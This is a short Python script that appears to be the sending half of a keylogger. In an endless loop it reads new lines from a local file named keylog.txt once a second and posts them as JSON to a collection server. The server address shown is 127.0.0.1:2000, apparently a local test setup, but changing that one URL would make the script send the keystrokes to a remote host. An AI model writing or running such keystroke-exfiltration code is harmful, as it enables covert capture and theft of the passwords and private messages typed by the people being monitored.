import requests
import time
import os

SERVER_URL = "http://127.0.0.1:2000/log"
# Resolve log file relative to this script's directory
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")

last_position = 0

while True:
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            f.seek(last_position)
            new_lines = f.readlines()
            last_position = f.tell()

        if new_lines:
            payload = {
                "logs": [line.strip() for line in new_lines]
            }

            r = requests.post(SERVER_URL, json=payload, timeout=5)

            print("Sent:", len(new_lines), "lines", "| Server:", r.status_code)

    except Exception as e:
        print("Error:", e)

    time.sleep(1)